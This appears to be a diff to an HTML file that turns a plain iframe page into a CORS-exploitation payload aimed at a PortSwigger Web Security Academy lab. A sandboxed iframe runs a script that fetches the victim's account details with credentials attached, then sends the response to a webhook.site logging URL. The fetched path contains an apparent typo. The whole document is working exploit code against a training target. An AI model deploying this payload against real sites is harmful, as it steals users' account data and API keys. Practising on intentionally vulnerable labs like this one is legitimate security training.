@@ -1,14 +1,10 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Embedding External Content</title>
-</head>
-<body>
-    <h1>Embedding Content from Another Website</h1>
-    <iframe src="https://0ad1001804b608468396516c00af0067.web-security-academy.net/accountDetails" width="600" height="400" frameborder="0">
-        Your browser does not support iframes.
-    </iframe>
-</body>
-</html>
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0ad1001804b608468396516c00af0067.web-security-academy.net/accountDetailst/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://webhook.site/1512def5-c717-41c1-acf1-baf3a8864967/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
